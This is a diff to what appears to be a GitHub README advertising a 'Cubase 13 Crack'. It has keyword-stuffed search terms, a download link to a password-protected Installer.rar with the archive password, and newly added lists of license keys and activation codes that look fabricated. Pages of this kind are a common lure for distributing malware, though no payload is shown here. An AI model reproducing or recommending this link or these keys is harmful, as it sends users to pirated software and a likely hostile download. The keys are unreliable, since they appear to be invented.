@@ -9,6 +9,20 @@ cubase-13-free cubase-13-pro cubase-pro-13 cubase-free-12 cubase-download cubase
 ## Download [Cubase 13 Crack](https://github.com/Fairydx/Cubase-13-Pro-Crack/releases/download/release/Installer.rar)
 ## Pass for archive : 2024
 
+<h2>License Key:</h2>
+<ul>
+<li>SLWSL-MCE45-IXA1M-RXSQ0-9VMRM</li>
+<li>OONFI-69EFV-GBORO-UBBSW-I280U</li>
+<li>2PURY-VQXUS-K0OWM-CEVSL-JTLF6</li>
+<li>9I9N7-JEOVU-RPQEW-FF46T-TZREZ</li>
+</ul>
+<h2>Activation Code:</h2>
+<ul>
+<li>ZGB0N-RYW9J-ZI4TZ-GJ8D0-3QCE7</li>
+<li>0WJ0T-JD629-CLR0M-0EZ7T-E4RYG</li>
+<li>EDAGQ-5EUU0-3SPEN-WX7HB-A0CVQ</li>
+<li>VWDD5-OBP0Q-XFGWR-ZE4U5-GH3U6</li>
+</ul>
 # Requirements:
 Windows 10/11
 
